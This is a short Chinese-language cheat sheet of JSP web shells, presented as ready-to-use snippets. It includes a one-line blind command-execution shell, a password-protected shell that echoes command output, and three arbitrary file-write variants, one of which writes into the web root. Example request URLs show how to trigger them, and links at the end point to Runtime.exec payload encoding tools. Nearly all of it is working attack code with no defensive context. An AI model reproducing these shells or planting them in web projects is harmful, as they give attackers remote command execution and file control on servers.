# Java/JSP

**一、无回显的命令执行（命令执行后不会在前端页面返回数据）**


```
<%Runtime.getRuntime().exec(request.getParameter("i"));%>

请求url：http://127.0.0.1/shell.jsp?i=whoami
```


**二、有回显带密码的命令执行（命令执行后会在前端返回数据）**

```
<%
    if("023".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
```



**三、文件写入（改写目标服务器里的文件,若文件不存在则创建）**

```markdown
1. ISO-8859-1输入:
new java.io.FileOutputStream(request.getParameter("file")).write(request.getParameter("content").getBytes());
请求url：http://127.0.0.1/input.jsp?file=root/test.txt&content=test

2. UTF-8输入:
new java.io.FileOutputStream(request.getParameter("file")).write(new String(request.getParameter("content").getBytes("ISO-8859-1"), "UTF-8").getBytes());
请求url：http://127.0.0.1/input.jsp?file=root/test.txt&content=test

3. Web目录写入;
new java.io.FileOutputStream(application.getRealPath("/") + "/" + request.getParameter("filename")).write(request.getParameter("content").getBytes());
请求url：http://127.0.0.1/input.jsp?file=test.txt&content=test
```


**四、编码相关**

Runtime-exec 编码原理 https://www.jianshu.com/p/ae3922db1f70

Runtime-exec 编码工具 https://www.bugku.net/runtime-exec-payloads/

Java在线运行环境 https://www.w3cschool.cn/tryrun/runcode?lang=java-openjdk